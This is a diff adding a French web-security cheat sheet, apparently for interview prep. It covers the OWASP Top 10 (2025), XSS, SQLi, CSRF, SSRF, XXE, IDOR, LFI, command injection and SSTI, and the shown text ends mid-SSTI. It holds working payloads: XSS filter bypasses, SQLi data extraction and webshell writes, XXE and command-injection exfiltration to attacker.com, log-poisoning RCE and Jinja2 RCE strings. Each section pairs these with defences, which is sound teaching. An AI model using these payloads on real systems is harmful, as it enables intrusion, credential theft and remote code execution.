+<span class="cm">Secure     → HTTPS seulement → bloque MITM</span>
+<span class="cm">SameSite   → Strict: jamais cross-site | Lax: GET navigation ok | None: toujours (+ Secure)</span>
+<span class="cm">SameSite=None sans Secure → cookie envoyé en HTTP = vol possible</span>
+<span class="cm">SameSite absent (ancien) = comportement Lax dans Chrome moderne</span></pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  3. OWASP TOP 10 (2025)
+══════════════════════════════════════ -->
+<section class="section" id="owasp">
+  <div class="section-header">
+    <span class="section-number">03</span>
+    <h2>OWASP Top 10 (2025)</h2>
+    <span class="badge badge-red">INCONTOURNABLE — VERSION 2025</span>
+  </div>
+
+  <div class="alert alert-danger">
+    <span class="alert-icon">🆕</span>
+    <div><strong>Changements majeurs vs 2021 :</strong> A02 et A03 ont bougé. <span class="danger-text">A03 est maintenant "Software Supply Chain Failures"</span> (anciennement "Vulnerable Components" A06). <span class="danger-text">A10 est une nouvelle catégorie</span> : "Mishandling of Exceptional Conditions" (remplace SSRF, qui est maintenant dans A01). En entretien, citez la version 2025 !</div>
+  </div>
+
+  <h3>Comparatif 2021 → 2025</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Rang 2025</th><th>Catégorie 2025</th><th>Rang 2021</th><th>Delta</th></tr>
+    <tr><td><code>A01</code></td><td>Broken Access Control <em>(inclut SSRF + CSRF)</em></td><td>A01</td><td style="color:var(--accent3)">= stable · +SSRF/CSRF absorbés</td></tr>
+    <tr><td><code>A02</code></td><td>Security Misconfiguration</td><td>A05</td><td style="color:var(--accent4)">↑ remonte de A05</td></tr>
+    <tr><td><code>A03</code></td><td>Software Supply Chain Failures ⭐ NEW SCOPE</td><td>A06</td><td style="color:var(--accent2)">↑ scope élargi supply chain</td></tr>
+    <tr><td><code>A04</code></td><td>Cryptographic Failures</td><td>A02</td><td style="color:var(--accent2)">↓ descend de A02</td></tr>
+    <tr><td><code>A05</code></td><td>Injection</td><td>A03</td><td style="color:var(--accent2)">↓ descend de A03</td></tr>
+    <tr><td><code>A06</code></td><td>Insecure Design</td><td>A04</td><td style="color:var(--accent2)">↓ descend de A04</td></tr>
+    <tr><td><code>A07</code></td><td>Authentication Failures</td><td>A07</td><td style="color:var(--accent3)">= stable</td></tr>
+    <tr><td><code>A08</code></td><td>Software or Data Integrity Failures</td><td>A08</td><td style="color:var(--accent3)">= stable</td></tr>
+    <tr><td><code>A09</code></td><td>Security Logging and Alerting Failures</td><td>A09</td><td style="color:var(--accent3)">= stable</td></tr>
+    <tr><td><code>A10</code></td><td>Mishandling of Exceptional Conditions ⭐ NOUVEAU</td><td>—</td><td style="color:var(--accent2)">🆕 Brand new 2025</td></tr>
+  </table></div>
+
+  <div class="owasp-grid" style="margin-top:20px">
+    <div class="owasp-card"><div class="owasp-num">A01</div><div class="owasp-title">Broken Access Control</div><div class="owasp-desc">100% des apps testées affectées. Absorbe SSRF (CWE-918) et CSRF (CWE-352). IDOR, privilege escalation, force browsing, JWT tampering, CORS misconfiguration.</div></div>
+    <div class="owasp-card"><div class="owasp-num">A02</div><div class="owasp-title">Security Misconfiguration</div><div class="owasp-desc">Remonte de A05→A02. CORS wildcard, debug actif, default credentials, headers sécurité absents, cloud storage public, permissions incorrectes.</div></div>
+    <div class="owasp-card" style="border-color:rgba(255,60,110,0.4)"><div class="owasp-num">A03</div><div class="owasp-title">Software Supply Chain Failures ⭐</div><div class="owasp-desc">Nouveau scope élargi. SolarWinds, Log4Shell, Bybit $1.5B (2025), npm worm Shai-Hulud (500+ packages). SBOM, CI/CD hardening, dépendances transitives.</div></div>
+    <div class="owasp-card"><div class="owasp-num">A04</div><div class="owasp-title">Cryptographic Failures</div><div class="owasp-desc">Données sensibles en clair, algos faibles (MD5, SHA1, DES), TLS mal configuré, clés hardcodées, entropie faible.</div></div>
+    <div class="owasp-card"><div class="owasp-num">A05</div><div class="owasp-title">Injection</div><div class="owasp-desc">SQLi, CMDi, LDAP, NoSQLi, XXE, SSTI. Entrée non validée interprétée comme commande. Prepared statements obligatoires.</div></div>
+    <div class="owasp-card"><div class="owasp-num">A06</div><div class="owasp-title">Insecure Design</div><div class="owasp-desc">Problèmes de conception : absence de threat modeling, logique métier exploitable, pas de defense-in-depth by design.</div></div>
+    <div class="owasp-card"><div class="owasp-num">A07</div><div class="owasp-title">Authentication Failures</div><div class="owasp-desc">Brute-force, credential stuffing, tokens faibles, session fixation, mauvaise gestion logout, MFA absent sur ressources critiques.</div></div>
+    <div class="owasp-card"><div class="owasp-num">A08</div><div class="owasp-title">Software & Data Integrity Failures</div><div class="owasp-desc">Pipelines CI/CD non sécurisés, insecure deserialization, SRI absent sur CDN, mises à jour non signées, artifacts non vérifiés.</div></div>
+    <div class="owasp-card"><div class="owasp-num">A09</div><div class="owasp-title">Security Logging & Alerting Failures</div><div class="owasp-desc">Logs insuffisants, pas d'alerte, logs non protégés. Retarde la détection des incidents (MTTD/MTTR impactés).</div></div>
+    <div class="owasp-card" style="border-color:rgba(255,60,110,0.4)"><div class="owasp-num">A10</div><div class="owasp-title">Mishandling of Exceptional Conditions ⭐ NEW</div><div class="owasp-desc">Nouveau 2025. Mauvaise gestion des erreurs : stack traces exposées, fail-open, race conditions transactionnelles, DoS via exhaustion de ressources. 24 CWEs mappés.</div></div>
+  </div>
+
+  <h3>Focus A03 — Software Supply Chain Failures (nouveau scope)</h3>
+  <div class="card card-danger">
+    <p>Exemples réels cités par OWASP 2025 :</p>
+    <ul>
+      <li><strong>SolarWinds (2019) :</strong> ~18 000 organisations compromises via mise à jour Orion backdoorée</li>
+      <li><strong>Log4Shell (CVE-2021-44228) :</strong> RCE dans Apache Log4j, impact mondial</li>
+      <li><strong>Bybit hack (2025) :</strong> Vol de $1.5 milliard via supply chain attack dans le wallet software — exécution conditionnelle du malware uniquement sur le wallet cible</li>
+      <li><strong>Shai-Hulud npm worm (2025) :</strong> Premier worm npm auto-propagant — 500+ packages infectés, harvest de npm tokens pour se propager</li>
+    </ul>
+  </div>
+  <pre><span class="cm"># Défenses Supply Chain (SBOM-first approach)</span>
+<span class="cm">→ Software Bill of Materials (SBOM) : inventaire complet de TOUTES les dépendances</span>
+<span class="cm">→ Outils : OWASP Dependency-Track, Dependency-Check, Snyk, retire.js</span>
+<span class="cm">→ Signed builds : vérifier la provenance des artifacts (Sigstore)</span>
+<span class="cm">→ Staged rollouts : ne pas déployer à tous les systèmes simultanément</span>
+<span class="cm">→ Séparation des rôles CI/CD : personne ne peut coder ET pousser en prod seul</span>
+<span class="cm">→ Pin les versions de dépendances + audit régulier CVE/NVD/OSV</span></pre>
+
+  <h3>Focus A10 — Mishandling of Exceptional Conditions (NEW 2025)</h3>
+  <div class="card card-warn">
+    <p>Nouvelle catégorie réunissant les problèmes de gestion d'erreurs et conditions exceptionnelles. 24 CWEs, dont :</p>
+    <ul>
+      <li><strong>CWE-636 — Not Failing Securely ("Fail Open") :</strong> quand une erreur se produit, le système laisse passer au lieu de bloquer</li>
+      <li><strong>CWE-209 :</strong> messages d'erreur révélant des informations internes (stack traces, chemins, versions)</li>
+      <li><strong>CWE-476 :</strong> null pointer dereference → crash exploitable</li>
+      <li><strong>Race conditions transactionnelles :</strong> débit/crédit non atomique → fraude potentielle</li>
+    </ul>
+  </div>
+  <pre><span class="cm"># Exemples d'exploitation A10</span>
+<span class="cm">Scénario 1 : Forcer des erreurs 500 pour lire les stack traces → SQLi recon</span>
+<span class="cm">Scénario 2 : Interrompre une transaction multi-étape → race condition → double spend</span>
+<span class="cm">Scénario 3 : Upload massif → ressources non libérées → DoS progressif</span>
+<span class="cm">Scénario 4 : Exception non catchée → fail open → bypass d'authentification</span>
+
+<span class="cm"># Défense</span>
+<span class="cm">→ Fail CLOSED (pas fail open) : toujours rejeter en cas de doute</span>
+<span class="cm">→ Erreurs génériques côté client, logs détaillés côté serveur uniquement</span>
+<span class="cm">→ Transactions atomiques avec rollback complet</span>
+<span class="cm">→ Rate limiting sur les endpoints qui génèrent des erreurs</span>
+<span class="cm">→ Global exception handler en dernier recours</span></pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  4. XSS
+══════════════════════════════════════ -->
+<section class="section" id="xss">
+  <div class="section-header">
+    <span class="section-number">04</span>
+    <h2>Cross-Site Scripting (XSS)</h2>
+    <span class="badge badge-red">CRITIQUE</span>
+  </div>
+
+  <div class="grid-3">
+    <div class="card card-danger">
+      <h4>Reflected XSS</h4>
+      <p>Payload dans la requête, reflété immédiatement dans la réponse. Non persistant. Requiert que la victime clique sur un lien malveillant.</p>
+    </div>
+    <div class="card card-danger">
+      <h4>Stored XSS</h4>
+      <p>Payload stocké en BDD, exécuté chaque fois que la page est chargée. Plus dangereux. Commentaires, profils, messages.</p>
+    </div>
+    <div class="card card-warn">
+      <h4>DOM-Based XSS</h4>
+      <p>Le payload ne passe jamais par le serveur. Le JS client lit un source (URL hash, localStorage) et l'injecte dans le DOM sans sanitization.</p>
+    </div>
+  </div>
+
+  <h3>Sources et Sinks DOM XSS</h3>
+  <pre><span class="cm"># Sources DOM (où l'attaquant contrôle la donnée)</span>
+document.URL, document.location, document.referrer
+location.href, location.hash, location.search
+window.name, document.cookie, localStorage, sessionStorage
+postMessage data
+
+<span class="cm"># Sinks dangereux (où la donnée est exécutée)</span>
+<span class="kw">document.write()</span>          <span class="cm">→ injection HTML</span>
+<span class="kw">innerHTML</span>, <span class="kw">outerHTML</span>      <span class="cm">→ injection HTML</span>
+<span class="kw">eval()</span>, <span class="kw">setTimeout(str)</span>   <span class="cm">→ exécution JS</span>
+<span class="kw">location.href = userInput</span> <span class="cm">→ javascript: URI</span>
+<span class="kw">src</span>, <span class="kw">href</span> attributes      <span class="cm">→ si non filtré</span>
+<span class="kw">$.html()</span>, <span class="kw">$(userInput)</span>    <span class="cm">→ jQuery sinks</span></pre>
+
+  <h3>Payloads & contournements</h3>
+  <pre><span class="cm"># Basique</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+<span class="cm"># Bypass filtres</span>
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;       <span class="cm">// case insensitive</span>
+&lt;script&gt;alert`1`&lt;/script&gt;       <span class="cm">// template literals (bypass parenthèses)</span>
+&lt;img src=x onerror="&#97;lert(1)"&gt; <span class="cm">// HTML entities</span>
+&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;body/onload=alert(1)&gt;
+
+<span class="cm"># XSS dans attributs</span>
+" onmouseover="alert(1)
+' autofocus onfocus='alert(1)
+
+<span class="cm"># XSS dans href (javascript: URI)</span>
+javascript:alert(document.cookie)
+JaVaScRiPt:alert(1)            <span class="cm">// bypass toLowerCase</span>
+
+<span class="cm"># Blind XSS (payload qui callback)</span>
+&lt;script src="https://your-server.com/x.js"&gt;&lt;/script&gt;</pre>
+
+  <h3>Impact XSS</h3>
+  <ul>
+    <li><strong>Vol de session :</strong> <code>document.cookie</code> → envoi vers serveur attaquant</li>
+    <li><strong>Keylogging :</strong> capturer les frappes clavier</li>
+    <li><strong>Phishing in-app :</strong> faux login form injecté</li>
+    <li><strong>CSRF via XSS :</strong> XSS bypasse les restrictions CSRF (même origine)</li>
+    <li><strong>Exfiltration de données :</strong> lecture du DOM, localStorage</li>
+    <li><strong>Webcam / microphone :</strong> via MediaDevices API si permissions accordées</li>
+    <li><strong>Defacement :</strong> modification visuelle</li>
+  </ul>
+
+  <h3>Préventions XSS</h3>
+  <ul>
+    <li><strong>Output encoding :</strong> encoder selon le contexte (HTML, JS, URL, CSS)</li>
+    <li><strong>CSP stricte :</strong> <code>script-src 'nonce-{random}'</code></li>
+    <li><strong>HttpOnly cookies :</strong> bloque le vol via <code>document.cookie</code></li>
+    <li><strong>DOMPurify :</strong> sanitisation côté client</li>
+    <li><strong>Trusted Types :</strong> API navigateur pour bloquer les sinks dangereux</li>
+  </ul>
+</section>
+
+<!-- ══════════════════════════════════════
+  5. SQL INJECTION
+══════════════════════════════════════ -->
+<section class="section" id="sqli">
+  <div class="section-header">
+    <span class="section-number">05</span>
+    <h2>SQL Injection</h2>
+    <span class="badge badge-red">CRITIQUE</span>
+  </div>
+
+  <h3>Types de SQLi</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Type</th><th>Description</th><th>Technique d'extraction</th></tr>
+    <tr><td><strong>In-band Error-based</strong></td><td>Erreur SQL visible dans la réponse</td><td>Messages d'erreur DB</td></tr>
+    <tr><td><strong>In-band Union-based</strong></td><td>UNION SELECT pour extraire données</td><td>Colonnes additionnelles</td></tr>
+    <tr><td><strong>Blind Boolean-based</strong></td><td>Comportement différent selon condition vraie/fausse</td><td>Inférence bit par bit</td></tr>
+    <tr><td><strong>Blind Time-based</strong></td><td>Délai si condition vraie (SLEEP, WAITFOR)</td><td>Timing attack</td></tr>
+    <tr><td><strong>Out-of-band</strong></td><td>DNS/HTTP callback extérieur</td><td>DNS exfiltration, XXE OOB</td></tr>
+    <tr><td><strong>Second-order</strong></td><td>Payload stocké, exécuté plus tard</td><td>Exploitation différée</td></tr>
+  </table></div>
+
+  <h3>Payloads classiques</h3>
+  <pre><span class="cm"># Test de base</span>
+' OR '1'='1
+' OR 1=1--
+" OR 1=1--
+') OR ('1'='1
+
+<span class="cm"># Union-based (trouver nb de colonnes)</span>
+' ORDER BY 1-- 
+' ORDER BY 2--   <span class="cm">← jusqu'à erreur</span>
+' UNION SELECT NULL,NULL,NULL--
+
+<span class="cm"># Extraction données (MySQL)</span>
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,2 FROM information_schema.tables--
+' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--
+
+<span class="cm"># Boolean Blind (MySQL)</span>
+' AND SUBSTRING(username,1,1)='a'--     <span class="cm">← vrai si 1er char = 'a'</span>
+' AND (SELECT COUNT(*) FROM users)>0--
+
+<span class="cm"># Time-based Blind</span>
+'; IF(1=1) WAITFOR DELAY '0:0:5'--    <span class="cm">(MSSQL)</span>
+' AND SLEEP(5)--                       <span class="cm">(MySQL)</span>
+'; SELECT pg_sleep(5)--               <span class="cm">(PostgreSQL)</span>
+
+<span class="cm"># Lecture de fichiers (MySQL)</span>
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+
+<span class="cm"># Écriture fichier (MySQL avec FILE priv)</span>
+' UNION SELECT "" INTO OUTFILE '/var/www/html/shell.php'--</pre>
+
+  <h3>Bases de données — différences clés</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Feature</th><th>MySQL</th><th>PostgreSQL</th><th>MSSQL</th><th>Oracle</th></tr>
+    <tr><td>Commentaire</td><td><code>-- </code> / <code>#</code></td><td><code>-- </code></td><td><code>-- </code></td><td><code>-- </code></td></tr>
+    <tr><td>Version</td><td><code>@@version</code></td><td><code>version()</code></td><td><code>@@version</code></td><td><code>v$version</code></td></tr>
+    <tr><td>Concat</td><td><code>CONCAT(a,b)</code></td><td><code>a||b</code></td><td><code>a+b</code></td><td><code>a||b</code></td></tr>
+    <tr><td>Sleep</td><td><code>SLEEP(5)</code></td><td><code>pg_sleep(5)</code></td><td><code>WAITFOR DELAY</code></td><td><code>dbms_pipe.receive_message</code></td></tr>
+    <tr><td>Tables système</td><td><code>information_schema</code></td><td><code>pg_catalog</code></td><td><code>sys.tables</code></td><td><code>ALL_TABLES</code></td></tr>
+  </table></div>
+
+  <h3>NoSQL Injection</h3>
+  <pre><span class="cm"># MongoDB — bypass authentification</span>
+POST /login
+{"username": {"$ne": null}, "password": {"$ne": null}}
+
+<span class="cm"># Opérateurs NoSQLi MongoDB</span>
+$ne  (not equal)  $gt  $regex  $where  $exists
+
+<span class="cm"># Injection dans URL params</span>
+GET /users?id[$ne]=0  → retourne tous les users si non filtré</pre>
+
+  <h3>Préventions SQLi</h3>
+  <ul>
+    <li><span class="success-text">Prepared Statements / Parameterized Queries</span> — séparation code/données</li>
+    <li><span class="success-text">ORM avec bindings sécurisés</span> — mais attention aux raw queries!</li>
+    <li>Whitelist de caractères autorisés, validation des inputs</li>
+    <li>Least privilege sur le compte DB (pas de FILE, pas de DROP)</li>
+    <li>WAF comme couche défense en profondeur (pas suffisant seul)</li>
+  </ul>
+</section>
+
+<!-- ══════════════════════════════════════
+  6. CSRF
+══════════════════════════════════════ -->
+<section class="section" id="csrf">
+  <div class="section-header">
+    <span class="section-number">06</span>
+    <h2>CSRF — Cross-Site Request Forgery</h2>
+    <span class="badge badge-high">HIGH</span>
+  </div>
+
+  <div class="card card-info">
+    <p>L'attaquant force un utilisateur authentifié à effectuer une action non voulue sur un site où il est connecté. Le navigateur envoie automatiquement les cookies de session avec la requête cross-site.</p>
+  </div>
+
+  <h3>Fonctionnement</h3>
+  <pre><span class="cm"># 1. Victime connectée sur bank.com avec cookie de session</span>
+<span class="cm"># 2. Victime visite evil.com</span>
+<span class="cm"># 3. evil.com contient :</span>
+&lt;img src="https://bank.com/transfer?to=attacker&amount=10000" /&gt;
+<span class="cm"># ou pour POST :</span>
+&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;
+  &lt;input name="to" value="attacker"&gt;
+  &lt;input name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;</pre>
+
+  <h3>Contournements de défenses CSRF</h3>
+  <ul>
+    <li><strong>Referer absent :</strong> supprimer le header Referer (meta Referrer-Policy: no-referrer)</li>
+    <li><strong>Origin header bypass :</strong> certaines configs autorisent null origin</li>
+    <li><strong>Token dans URL :</strong> si le token CSRF est prévisible ou leaké via Referer</li>
+    <li><strong>Double Submit Cookie bypass :</strong> si l'attaquant peut écrire des cookies (sous-domaine compromis)</li>
+    <li><strong>CSRF + XSS :</strong> XSS sur la cible permet de lire et rejouer le token CSRF</li>
+    <li><strong>SameSite=None :</strong> cookies envoyés en cross-site → CSRF possible</li>
+    <li><strong>SameSite=Lax bypass :</strong> GET requests de navigation top-level → CSRF sur GET actions</li>
+  </ul>
+
+  <h3>Défenses</h3>
+  <ul>
+    <li><span class="success-text">CSRF Token synchronizer pattern</span> : token aléatoire par session inclus dans chaque form</li>
+    <li><span class="success-text">SameSite=Strict</span> sur les cookies de session</li>
+    <li>Vérification du header Origin/Referer (mais pas suffisant seul)</li>
+    <li>Double Submit Cookie pattern (attention aux sous-domaines)</li>
+    <li>Custom header sur requêtes AJAX (XMLHttpRequest ne peut pas être cross-origin sans CORS)</li>
+  </ul>
+</section>
+
+<!-- ══════════════════════════════════════
+  7. SSRF
+══════════════════════════════════════ -->
+<section class="section" id="ssrf">
+  <div class="section-header">
+    <span class="section-number">07</span>
+    <h2>Server-Side Request Forgery (SSRF)</h2>
+    <span class="badge badge-red">CRITIQUE</span>
+  </div>
+
+  <div class="card card-danger">
+    <p>L'attaquant force le serveur à faire des requêtes HTTP vers des destinations qu'il contrôle : interne (metadata cloud, services non exposés) ou externe.</p>
+  </div>
+
+  <h3>Cibles SSRF classiques</h3>
+  <pre><span class="cm"># Cloud metadata (AWS, GCP, Azure)</span>
+http://169.254.169.254/latest/meta-data/               <span class="cm">(AWS IMDSv1)</span>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/    <span class="cm">(GCP — header requis)</span>
+http://169.254.169.254/metadata/v1/                    <span class="cm">(Azure)</span>
+
+<span class="cm"># Services internes</span>
+http://localhost:8080/admin
+http://127.0.0.1:6379/  <span class="cm">→ Redis (no auth par défaut)</span>
+http://internal-service/api/admin
+
+<span class="cm"># Autres protocoles (Blind SSRF)</span>
+file:///etc/passwd
+dict://localhost:11211/  <span class="cm">→ Memcached</span>
+gopher://localhost:6379/ <span class="cm">→ Redis via Gopher</span>
+ftp://internal-host/</pre>
+
+  <h3>Bypasses de filtres SSRF</h3>
+  <pre><span class="cm"># Encodage IP</span>
+http://0177.0.0.1/       <span class="cm">(octal 127.0.0.1)</span>
+http://0x7f000001/       <span class="cm">(hex)</span>
+http://2130706433/       <span class="cm">(decimal)</span>
+http://127.1/            <span class="cm">(notation courte)</span>
+
+<span class="cm"># IPv6</span>
+http://[::1]/
+http://[::ffff:127.0.0.1]/
+
+<span class="cm"># DNS rebinding</span>
+http://attacker-domain.com/  <span class="cm">→ résout d'abord IP publique (validation), puis 127.0.0.1 (exploitation)</span>
+
+<span class="cm"># Open redirect chain</span>
+https://trusted.com/redirect?url=http://169.254.169.254/
+
+<span class="cm"># URL shorteners</span>
+http://bit.ly/xxxx → redirige vers 127.0.0.1
+
+<span class="cm"># Domain tricks</span>
+http://localhost.example.com/     <span class="cm">(si DNS résout en 127.0.0.1)</span>
+http://evil.com%<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9fadd9dffae9f6f3b1fcf0f2">[email&#160;protected]</a>/ <span class="cm">(parsing ambiguité)</span>
+http://169.254.169.254.evil.com/  <span class="cm">(subdomain confusion)</span>
+
+<span class="cm"># nip.io / xip.io (DNS wildcard → résout l'IP dans le nom)</span>
+http://127.0.0.1.nip.io/</pre>
+
+  <h3>Blind SSRF</h3>
+  <p>Pas de réponse visible → utiliser Burp Collaborator, interactsh, ou un serveur de callback pour détecter les connexions entrantes.</p>
+
+  <h3>Défenses SSRF</h3>
+  <ul>
+    <li>Whitelist stricte des URLs/IPs autorisées (pas de blacklist)</li>
+    <li>Résoudre le DNS puis vérifier l'IP résolue (protège du DNS rebinding)</li>
+    <li>Désactiver les redirections HTTP</li>
+    <li>Utiliser IMDSv2 sur AWS (token requis, pas juste GET)</li>
+    <li>Réseau : isoler les services internes du serveur web</li>
+  </ul>
+</section>
+
+<!-- ══════════════════════════════════════
+  8. XXE
+══════════════════════════════════════ -->
+<section class="section" id="xxe">
+  <div class="section-header">
+    <span class="section-number">08</span>
+    <h2>XML External Entity (XXE)</h2>
+    <span class="badge badge-red">CRITIQUE</span>
+  </div>
+
+  <h3>Exploitation basique</h3>
+  <pre><span class="cm"># Lecture de fichier local</span>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+
+<span class="cm"># SSRF via XXE</span>
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+
+<span class="cm"># XXE Out-of-Band (Blind) — exfiltration via DTD externe</span>
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %xxe;
+]&gt;
+
+<span class="cm"># evil.dtd sur le serveur attaquant :</span>
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'&gt;"&gt;
+%eval;
+%exfil;</pre>
+
+  <h3>Surfaces d'attaque XXE</h3>
+  <ul>
+    <li>Upload de fichiers XML, SVG, DOCX, XLSX, PDF (tous XML sous le capot)</li>
+    <li>APIs REST qui acceptent <code>Content-Type: application/xml</code></li>
+    <li>SOAP WebServices</li>
+    <li>Fichiers de config XML</li>
+  </ul>
+
+  <h3>Défenses XXE</h3>
+  <ul>
+    <li>Désactiver le traitement des entités externes dans le parser XML</li>
+    <li>Java: <code>factory.setFeature("http://xml.org/sax/features/external-general-entities", false)</code></li>
+    <li>Utiliser des formats moins complexes (JSON) si possible</li>
+    <li>Patcher les bibliothèques XML</li>
+  </ul>
+</section>
+
+<!-- ══════════════════════════════════════
+  9. IDOR / BAC
+══════════════════════════════════════ -->
+<section class="section" id="idor">
+  <div class="section-header">
+    <span class="section-number">09</span>
+    <h2>IDOR &amp; Broken Access Control</h2>
+    <span class="badge badge-red">OWASP #1 2021</span>
+  </div>
+
+  <div class="card card-danger">
+    <p><strong>IDOR (Insecure Direct Object Reference)</strong> : accéder à des objets en manipulant des références directes (IDs) sans vérification d'autorisation côté serveur.</p>
+  </div>
+
+  <h3>Types de références</h3>
+  <pre><span class="cm"># Numérique séquentiel (trivial)</span>
+GET /api/invoices/1337 → essayer 1338, 1336
+
+<span class="cm"># GUID/UUID (moins évident mais toujours possible si leaké)</span>
+GET /api/docs/550e8400-e29b-41d4-a716-446655440000
+
+<span class="cm"># Hash MD5 de l'email (prédictible)</span>
+GET /api/profile/5d41402abc4b2a76b9719d911017c592
+
+<span class="cm"># Paramètre caché</span>
+POST /api/updateUser
+{"userId": 1337, "email": "new&#64;email.com"}  → changer userId</pre>
+
+  <h3>Vertical vs Horizontal Privilege Escalation</h3>
+  <div class="grid-2">
+    <div class="card card-warn">
+      <h4>Horizontal (même rôle)</h4>
+      <p>User A accède aux données de User B. Même niveau de privilège, différent utilisateur. Exemple : voir la facture d'un autre client.</p>
+    </div>
+    <div class="card card-danger">
+      <h4>Vertical (rôle supérieur)</h4>
+      <p>User normal accède à des fonctions admin. Exemple : endpoint <code>/admin/users</code> accessible sans vérification de rôle.</p>
+    </div>
+  </div>
+
+  <h3>Broken Access Control — patterns communs</h3>
+  <ul>
+    <li>Changer <code>role=user</code> → <code>role=admin</code> dans la requête / cookie</li>
+    <li>Accéder à <code>/admin</code> via variation d'URL : <code>/Admin</code>, <code>/ADMIN</code>, <code>//admin</code></li>
+    <li>Méthode HTTP non vérifiée : <code>GET /admin</code> bloqué mais <code>POST /admin</code> accessible</li>
+    <li>JWT : modifier le payload sans vérification de signature (<code>alg: none</code>)</li>
+    <li>Mass Assignment : <code>{"username":"x","isAdmin":true}</code></li>
+    <li>Path traversal dans l'ID : <code>/api/files/../../../etc/passwd</code></li>
+  </ul>
+</section>
+
+<!-- ══════════════════════════════════════
+  10. PATH TRAVERSAL / LFI
+══════════════════════════════════════ -->
+<section class="section" id="traversal">
+  <div class="section-header">
+    <span class="section-number">10</span>
+    <h2>Path Traversal &amp; LFI/RFI</h2>
+    <span class="badge badge-high">HIGH</span>
+  </div>
+
+  <h3>Path Traversal</h3>
+  <pre><span class="cm"># Basique</span>
+GET /download?file=../../../etc/passwd
+GET /read?path=....//....//etc/passwd     <span class="cm">(bypass filtre ../)</span>
+GET /file?name=..%2F..%2Fetc%2Fpasswd    <span class="cm">(URL encoded)</span>
+GET /file?name=..%252F..%252Fetc/passwd  <span class="cm">(double encoded)</span>
+GET /file?name=....\/....\/etc/passwd    <span class="cm">(mix slash)</span>
+
+<span class="cm"># Bypass de filtre "doit commencer par /uploads"</span>
+/uploads/../../../etc/passwd
+/uploads/....//....//etc/passwd</pre>
+
+  <h3>LFI (Local File Inclusion)</h3>
+  <pre><span class="cm"># PHP classique</span>
+?page=../../../../etc/passwd
+?lang=php://filter/convert.base64-encode/resource=index.php <span class="cm">← lire source PHP</span>
+
+<span class="cm"># LFI → RCE via log poisoning</span>
+<span class="cm">1. Injecter dans User-Agent : &lt;?php system($_GET['cmd']); ?&gt;</span>
+<span class="cm">2. Include le log Apache : ?page=/var/log/apache2/access.log&cmd=id</span>
+
+<span class="cm"># Wrappers PHP intéressants</span>
+php://input          <span class="cm">→ envoyer du PHP dans le POST body</span>
+php://filter         <span class="cm">→ lire fichiers en base64</span>
+data://text/plain    <span class="cm">→ data URI (si allow_url_include)</span>
+zip://               <span class="cm">→ RCE via zip upload</span>
+phar://              <span class="cm">→ phar deserialization</span>
+
+<span class="cm"># Fichiers sensibles cibles</span>
+/etc/passwd · /etc/shadow · /proc/self/environ · /proc/self/cmdline
+/var/log/apache2/access.log · /var/log/nginx/access.log
+~/.ssh/id_rsa · /app/config.php · /.env</pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  11. COMMAND INJECTION
+══════════════════════════════════════ -->
+<section class="section" id="cmdi">
+  <div class="section-header">
+    <span class="section-number">11</span>
+    <h2>Command Injection</h2>
+    <span class="badge badge-red">CRITIQUE → RCE</span>
+  </div>
+
+  <pre><span class="cm"># Séparateurs de commandes</span>
+; id                    <span class="cm">séquentiel</span>
+&amp;&amp; id                   <span class="cm">si précédente réussit</span>
+|| id                   <span class="cm">si précédente échoue</span>
+| id                    <span class="cm">pipe</span>
+`id`                    <span class="cm">backtick (bash)</span>
+$(id)                   <span class="cm">substitution de commande</span>
+%0a id                  <span class="cm">newline (URL encoded)</span>
+
+<span class="cm"># Bypass filtres d'espace</span>
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat&lt;/etc/passwd
+
+<span class="cm"># Out-of-band (Blind CMDi)</span>
+; nslookup attacker.com
+; curl http://attacker.com/$(whoami)
+; ping -c 1 attacker.com</pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  12. SSTI
+══════════════════════════════════════ -->
+<section class="section" id="ssti">
+  <div class="section-header">
+    <span class="section-number">12</span>
+    <h2>Server-Side Template Injection (SSTI)</h2>
+    <span class="badge badge-red">CRITIQUE → RCE</span>
+  </div>
+
+  <h3>Détection & Identification</h3>
+  <pre><span class="cm"># Payloads de détection (mathématiques)</span>
+{{7*7}}     <span class="cm">→ 49 ? → Jinja2/Twig</span>
+${7*7}      <span class="cm">→ 49 ? → FreeMarker/Velocity</span>
+&lt;%= 7*7 %&gt; <span class="cm">→ 49 ? → ERB (Ruby)</span>
+#{7*7}      <span class="cm">→ 49 ? → Pebble</span>
+
+<span class="cm"># Identification fine</span>
+{{7*'7'}}   <span class="cm">→ '7777777' = Jinja2 | 49 = Twig</span></pre>
+
+  <h3>Exploitation par moteur</h3>
+  <pre><span class="cm">## Jinja2 (Python/Flask)</span>
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['__builtins__']['__import__']('os').system('id')}}
+
